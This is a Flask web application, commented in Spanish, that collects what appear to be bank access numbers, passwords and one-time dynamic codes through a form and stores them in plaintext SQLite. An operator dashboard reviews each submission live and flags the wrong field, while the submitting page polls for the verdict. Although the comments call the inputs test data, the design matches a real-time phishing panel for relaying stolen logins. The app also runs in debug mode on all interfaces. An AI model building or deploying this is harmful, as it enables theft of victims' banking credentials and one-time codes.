# datetime permite guardar la fecha y hora en que se crea o revisa un registro.
from datetime import datetime

# Path ayuda a construir rutas de archivos sin escribirlas manualmente.
from pathlib import Path

# sqlite3 es la libreria que permite trabajar con la base de datos SQLite.
import sqlite3
import os

from flask import Flask, flash, g, jsonify, redirect, render_template, request, session, url_for


# BASE_DIR guarda la carpeta donde esta este archivo app.py.
BASE_DIR = Path(__file__).resolve().parent

# DATABASE guarda la ruta completa del archivo donde SQLite guardara los datos.
DATABASE = BASE_DIR / "proyecto_prueba.db"

# Aqui se crea la aplicacion Flask.
app = Flask(__name__)

# secret_key permite usar sesiones y mensajes temporales en Flask.
app.secret_key = os.environ.get("SECRET_KEY", "cambia-esta-clave-en-desarrollo")

# Estados posibles de cada registro dentro del sistema.
ESTADOS = {
    "pendiente": "Pendiente",
    "correcta": "Correcta",
    "incorrecta": "Incorrecta",
}

# Campos que el dashboard puede marcar como incorrectos.
CAMPOS_INCORRECTOS = {
    "numero_clave": "Numero clave",
    "clave": "Clave",
    "clave_dinamica": "Clave dinamica",
    "varios": "Varios campos",
}


def fila_a_diccionario(fila):
    # Convierte una fila de SQLite en un diccionario normal de Python.
    # Esto es util para poder enviarla como JSON al navegador.
    return dict(fila)


def obtener_datos_dashboard():
    # Reune en un solo lugar todos los datos que necesita el dashboard.
    db = get_db()

    pendientes = db.execute(
        "SELECT * FROM ingresos WHERE estado = 'pendiente' ORDER BY id DESC"
    ).fetchall()

    historial = db.execute(
        "SELECT * FROM ingresos WHERE estado != 'pendiente' ORDER BY id DESC LIMIT 50"
    ).fetchall()

    totales = db.execute(
        """
        SELECT
            COUNT(*) AS total,
            COALESCE(SUM(CASE WHEN estado = 'pendiente' THEN 1 ELSE 0 END), 0) AS pendientes,
            COALESCE(SUM(CASE WHEN estado = 'correcta' THEN 1 ELSE 0 END), 0) AS correctas,
            COALESCE(SUM(CASE WHEN estado = 'incorrecta' THEN 1 ELSE 0 END), 0) AS incorrectas
        FROM ingresos
        """
    ).fetchone()

    return {
        "pendientes": [fila_a_diccionario(fila) for fila in pendientes],
        "historial": [fila_a_diccionario(fila) for fila in historial],
        "totales": fila_a_diccionario(totales),
    }


def obtener_estado_registro(registro_id):
    # Si no llega un id, no se puede buscar ningun registro.
    if not registro_id:
        return None

    # Busca en la base de datos el estado del registro indicado.
    # El signo ? evita insertar valores directamente dentro del SQL.
    return get_db().execute(
        """
        SELECT id, estado, campo_incorrecto, nota_revision
        FROM ingresos
        WHERE id = ?
        """,
        (registro_id,),
    ).fetchone()


def get_db():
    # g es un objeto especial de Flask para guardar datos durante una peticion.
    # Si todavia no existe una conexion, se crea una nueva.
    if "db" not in g:
        g.db = sqlite3.connect(DATABASE)

        # row_factory permite leer los resultados como diccionarios.
        # Ejemplo: registro["estado"] en vez de registro[1].
        g.db.row_factory = sqlite3.Row
    return g.db


@app.teardown_appcontext
def close_db(error=None):
    # Al terminar la peticion, Flask llama esta funcion para cerrar la conexion.
    db = g.pop("db", None)
    if db is not None:
        db.close()


def init_db():
    # Obtiene la conexion activa a SQLite.
    db = get_db()

    # CREATE TABLE IF NOT EXISTS crea la tabla solo si todavia no existe.
    db.execute(
        """
        CREATE TABLE IF NOT EXISTS ingresos (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            numero_clave TEXT NOT NULL,
            clave TEXT NOT NULL,
            clave_dinamica TEXT NOT NULL,
            estado TEXT NOT NULL DEFAULT 'pendiente',
            campo_incorrecto TEXT,
            nota_revision TEXT,
            creado_en TEXT NOT NULL,
            revisado_en TEXT
        )
        """
    )

    # commit confirma los cambios en la base de datos.
    db.commit()


@app.before_request
def prepare_database():
    # Antes de cada peticion se asegura que la tabla exista.
    init_db()


@app.route("/")
def index():
    # Esta ruta muestra el dashboard de revision.
    datos = obtener_datos_dashboard()

    # render_template envia los datos de Python hacia el HTML index.html.
    return render_template(
        "index.html",
        pendientes=datos["pendientes"],
        historial=datos["historial"],
        totales=datos["totales"],
        estados=ESTADOS,
        campos_incorrectos=CAMPOS_INCORRECTOS,
    )


@app.route("/dashboard-datos")
def dashboard_datos():
    # Esta ruta devuelve los datos del dashboard en JSON.
    # JavaScript la consulta cada pocos segundos para actualizar sin recargar.
    return jsonify(obtener_datos_dashboard())


@app.route("/ingresar", methods=["GET", "POST"])
def ingresar():
    # GET significa que el navegador solo esta pidiendo ver la pagina.
    # POST significa que el usuario envio el formulario.
    if request.method == "POST":
        # request.form lee los campos enviados desde el formulario HTML.
        # strip() elimina espacios al inicio y al final.
        numero_clave = request.form.get("numero_clave", "").strip()
        clave = request.form.get("clave", "").strip()
        clave_dinamica = request.form.get("clave_dinamica", "").strip()

        # Si algun campo esta vacio, se muestra un mensaje y no se guarda nada.
        if not numero_clave or not clave or not clave_dinamica:
            flash("Completa todos los datos de prueba.", "warning")
            return redirect(url_for("ingresar"))

        db = get_db()

        # Inserta un nuevo registro con estado pendiente.
        db.execute(
            """
            INSERT INTO ingresos
                (numero_clave, clave, clave_dinamica, creado_en)
            VALUES (?, ?, ?, ?)
            """,
            (
                numero_clave,
                clave,
                clave_dinamica,
                datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            ),
        )

        # Obtiene el id del registro que se acaba de crear.
        registro_id = db.execute("SELECT last_insert_rowid()").fetchone()[0]
        db.commit()

        # Guarda el id en la sesion para que esta misma pantalla pueda consultar su estado.
        session["registro_actual_id"] = registro_id
        return redirect(url_for("ingresar"))

    # Si la pagina se abre por GET, se revisa si hay un registro pendiente en la sesion.
    registro_actual = obtener_estado_registro(session.get("registro_actual_id"))
    return render_template(
        "ingresar.html",
        registro_actual=registro_actual,
        campos_incorrectos=CAMPOS_INCORRECTOS,
    )


@app.route("/estado/<int:registro_id>")
def estado(registro_id):
    # Esta ruta la usa JavaScript para saber si un registro ya fue revisado.
    registro = obtener_estado_registro(registro_id)

    if not registro:
        # Si no existe el registro, se responde con error 404.
        return jsonify({"encontrado": False}), 404

    # jsonify convierte un diccionario de Python en una respuesta JSON.
    return jsonify(
        {
            "encontrado": True,
            "estado": registro["estado"],
            "campo_incorrecto": registro["campo_incorrecto"],
            "campo_incorrecto_texto": CAMPOS_INCORRECTOS.get(
                registro["campo_incorrecto"], ""
            ),
            "nota_revision": registro["nota_revision"] or "",
        }
    )


@app.route("/revisar/<int:registro_id>", methods=["POST"])
def revisar(registro_id):
    # Esta ruta recibe la decision tomada desde el dashboard.
    accion = request.form.get("accion")
    campo_incorrecto = request.form.get("campo_incorrecto") or None
    nota_revision = request.form.get("nota_revision", "").strip() or None

    # Solo se permiten dos acciones: correcta o incorrecta.
    if accion not in {"correcta", "incorrecta"}:
        flash("Selecciona si la informacion es correcta o incorrecta.", "warning")
        return redirect(url_for("index"))

    # Si se marca como incorrecta, es obligatorio escoger el campo incorrecto.
    if accion == "incorrecta" and campo_incorrecto not in CAMPOS_INCORRECTOS:
        flash("Escoge cual dato esta incorrecto.", "warning")
        return redirect(url_for("index"))

    db = get_db()

    # Actualiza el registro solo si sigue pendiente.
    resultado = db.execute(
        """
        UPDATE ingresos
        SET estado = ?,
            campo_incorrecto = ?,
            nota_revision = ?,
            revisado_en = ?
        WHERE id = ? AND estado = 'pendiente'
        """,
        (
            accion,
            campo_incorrecto if accion == "incorrecta" else None,
            nota_revision,
            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            registro_id,
        ),
    )
    db.commit()

    # rowcount indica cuantas filas fueron modificadas.
    if resultado.rowcount == 0:
        flash("El registro no existe o ya fue revisado.", "warning")
    elif accion == "correcta":
        flash("Informacion marcada como correcta.", "success")
    else:
        flash("Informacion incorrecta registrada.", "danger")

    return redirect(url_for("index"))


@app.route("/generar")
def generar():
    # Ruta antigua que se conserva para redirigir al nuevo formulario.
    return redirect(url_for("ingresar"))


if __name__ == "__main__":
    # Este bloque se ejecuta cuando iniciamos el proyecto con python app.py.
    port = int(os.environ.get("PORT", 5000))
    print(f"Servidor iniciado en http://127.0.0.1:{port}")
    app.run(debug=True, host="0.0.0.0", port=port)
